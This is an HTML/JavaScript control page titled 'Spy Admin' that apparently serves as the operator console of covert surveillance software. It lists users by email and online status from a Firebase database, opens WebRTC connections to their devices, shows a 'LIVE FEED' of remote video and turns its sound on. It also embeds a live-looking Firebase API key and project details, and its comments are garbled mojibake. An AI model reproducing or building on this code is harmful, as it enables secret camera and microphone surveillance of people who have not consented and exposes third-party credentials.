<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spy Admin (Force Play)</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="https://unpkg.com/simple-peer@9.11.1/simplepeer.min.js"></script>
    <style>
        body { background: #111; color: white; font-family: sans-serif; padding: 10px; text-align: center; }
        #userList li { background: #222; padding: 10px; margin: 5px; border: 1px solid #444; cursor: pointer; }
        .online { color: #0f0; }
        
        #videoContainer { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; flex-direction: column; align-items: center; justify-content: center; }
        video { width: 90%; border: 3px solid #0f0; margin-bottom: 20px; }
        
        .play-btn { padding: 15px 30px; background: #00ffcc; color: black; font-weight: bold; border: none; font-size: 18px; display: none; margin-top: -50px; position: relative; z-index: 1000; cursor: pointer; }
    </style>
</head>
<body>

    <h3>üïµÔ∏è Spy Control</h3>
    <ul id="userList">Scanning...</ul>

    <div id="videoContainer">
        <h3 id="status">Connecting...</h3>
        
        <video id="remoteVideo" autoplay playsinline muted></video>
        
        <button id="forceBtn" class="play-btn" onclick="forcePlay()">‚ñ∂ CLICK TO START VIDEO</button>
        
        <br><br>
        <button onclick="location.reload()" style="background: red; color: white; padding: 10px;">DISCONNECT</button>
    </div>

    <script>
        const firebaseConfig = {
          apiKey: "AIzaSyBy5AGDGQFZqbL83fKQfLViX_pyOu6AJ38",
          authDomain: "phone-f605e.firebaseapp.com",
          databaseURL: "https://phone-f605e-default-rtdb.firebaseio.com",
          projectId: "phone-f605e",
          storageBucket: "phone-f605e.firebasestorage.app",
          messagingSenderId: "902490805880",
          appId: "1:902490805880:web:98a5ed1432a0e3538e3f8d",
          measurementId: "G-WSJDCYKM3F"
        };

        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        let currentPeer = null;

        db.ref("users").on("value", snapshot => {
            document.getElementById("userList").innerHTML = "";
            snapshot.forEach(child => {
                const li = document.createElement("li");
                const isOnline = child.val().status === "online";
                li.innerHTML = `${child.val().email} <span class="${isOnline?'online':''}">${isOnline?'‚óè':''}</span>`;
                if(isOnline) li.onclick = () => connect(child.key);
                document.getElementById("userList").appendChild(li);
            });
        });

        function connect(uid) {
            document.getElementById("videoContainer").style.display = "flex";
            document.getElementById("status").innerText = "Handshaking...";
            
            // Clean up
            db.ref("users/" + uid + "/offer").remove();
            db.ref("users/" + uid + "/answer").remove().then(() => {
                
                currentPeer = new SimplePeer({ 
                    initiator: true, 
                    trickle: false,
                     config: { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] }
                });

                currentPeer.on('signal', offer => db.ref("users/" + uid + "/offer").set(offer));

                db.ref("users/" + uid + "/answer").on("value", snap => {
                    if(snap.val() && currentPeer) currentPeer.signal(snap.val());
                });

                currentPeer.on('stream', stream => {
                    document.getElementById("status").innerText = "üî¥ LIVE FEED RECEIVED";
                    const video = document.getElementById("remoteVideo");
                    video.srcObject = stream;
                    
                    // ‡¶Ö‡¶ü‡ßã‡¶Æ‡ßá‡¶ü‡¶ø‡¶ï ‡¶™‡ßç‡¶≤‡ßá ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶ö‡ßá‡¶∑‡ßç‡¶ü‡¶æ
                    video.play().catch(() => {
                        // ‡¶Ø‡¶¶‡¶ø ‡¶Ö‡¶ü‡ßã ‡¶™‡ßç‡¶≤‡ßá ‡¶®‡¶æ ‡¶π‡ßü, ‡¶¨‡¶æ‡¶ü‡¶® ‡¶¶‡ßá‡¶ñ‡¶æ‡¶ì
                        document.getElementById("forceBtn").style.display = "block";
                    });
                });
            });
        }

        function forcePlay() {
            const video = document.getElementById("remoteVideo");
            video.play();
            video.muted = false; // ‡¶∏‡¶æ‡¶â‡¶®‡ßç‡¶° ‡¶Ö‡¶® ‡¶π‡¶¨‡ßá
            document.getElementById("forceBtn").style.display = "none";
        }
    </script>
</body>
</html>